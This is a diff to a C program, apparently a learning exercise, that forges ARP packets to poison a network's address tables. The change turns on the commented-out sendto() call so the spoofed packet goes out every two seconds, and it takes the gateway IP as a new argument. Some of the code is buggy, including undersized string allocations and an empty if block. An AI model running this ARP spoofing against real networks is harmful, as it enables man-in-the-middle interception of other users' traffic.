@@ -17,7 +17,6 @@ struct Parameter_Pthread{
 // ########## Sending contaminated ARP packets ##########
 // ########## Period : 2 sec ##########
 void* Attack(void* info){
-  printf("\n----------_ARP_----------\n");
   struct Parameter_Pthread* PP = (struct Parameter_Pthread*)(info);
   struct in_addr src_in_addr, target_in_addr;
   ARP_header attack_packet;
@@ -41,14 +40,14 @@ void* Attack(void* info){
   strcpy(sa.sa_data, DEFAULT_DEVICE);
 
   while(1){
+    printf("\n----------_ARP_----------\n");
     attack_packet.Print_ARP();
+    if(sendto(sock, &attack_packet, sizeof(attack_packet), 0, &sa, sizeof(sa)) < 0){
+        perror("sendto error");
+        exit(1);
+    }
     sleep(2);
   }
-
-  //if(sendto(sock, &pkt, sizeof(pkt), 0, &sa, sizeof(sa)) < 0){
-  //    perror("sendto error");
-  //    exit(1);
-  //}
 }
 
 void Print_Data(const u_char* Packet_DATA){
@@ -92,7 +91,7 @@ void convert_mac(const char* data, char* cvrt_str, int s){
 }
 
 int main(int argc, char* argv[]) {
-  if (argc != 3) {
+  if (argc != 4) {
     usage();
     return -1;
   }
@@ -114,8 +113,6 @@ int main(int argc, char* argv[]) {
   struct sockaddr_in* sock;
   struct ifconf ifcnf_s;
   struct ifreq* ifr_s;
-
-  char* s_ip_addr = (char*)malloc(sizeof(sock->sin_addr));
 
   sockfd = socket(PF_INET, SOCK_DGRAM, 0);
   if(sockfd < 0){
@@ -145,16 +142,12 @@ int main(int argc, char* argv[]) {
 
     if(ifr_s->ifr_flags & IFF_LOOPBACK) continue;
     sock = (struct sockaddr_in*)&ifr_s->ifr_addr;
-    sprintf(s_ip_addr, "%s", inet_ntoa(sock->sin_addr));
     if(ioctl(sockfd, SIOCGIFHWADDR, ifr_s) < 0){
       perror("ioctl - SIOCGFHWADDR error");
       return -1;
     }
     convert_mac(ether_ntoa((struct ether_addr*)(ifr_s->ifr_hwaddr.sa_data)), s_mac_addr, sizeof(s_mac_addr)-1);
   }
-  
-  //printf("\n<Attacker IP Address> - %s\n", s_ip_addr);
-  //printf("<Attacker MAC Address> - %s\n", s_mac_addr);
 
   char* a_mac_addr = (char*)malloc(sizeof(s_mac_addr));
   if(a_mac_addr == NULL){ perror("a_mac_addr malloc error"); exit(1); }
@@ -176,14 +169,14 @@ int main(int argc, char* argv[]) {
   if(pt.argv_1 == NULL){ perror("pt.argv_1 malloc error"); exit(1); }
   pt.argv_2 = (char*)malloc(strlen(argv[2]));
   if(pt.argv_2 == NULL){ perror("pt.argv_2 malloc error"); exit(1); }
-  pt.aIPaddr = (char*)malloc(strlen(s_ip_addr));
+  pt.aIPaddr = (char*)malloc(strlen(argv[3])); // gateway IP
   if(pt.aIPaddr == NULL){ perror("pt.aIPaddr malloc error"); exit(1); }
   pt.aMACaddr = (char*)malloc(strlen(a_mac_addr));
   if(pt.aMACaddr == NULL){ perror("pt.aMACaddr malloc error"); exit(1); }
 
   strncpy(pt.argv_1, argv[1], strlen(argv[1]));
   strncpy(pt.argv_2, argv[2], strlen(argv[2]));
-  strncpy(pt.aIPaddr, s_ip_addr, strlen(s_ip_addr));
+  strncpy(pt.aIPaddr, argv[3], strlen(argv[3]));
   strncpy(pt.aMACaddr, a_mac_addr, strlen(a_mac_addr));
 
   if(pthread_create(&thread, NULL, Attack, (void*)&pt) < 0){
@@ -207,7 +200,12 @@ int main(int argc, char* argv[]) {
     tmp = Eh.Print_Eth(packet);
     //printf("packet : %d\n", tmp);
     if(tmp > 14) break;
+    packet += 14;
     printf("\n");
+
+    if(packet){
+      
+    }
   }
   pthread_join(thread, (void**)&status);
   //printf("Thread %d\n", status);
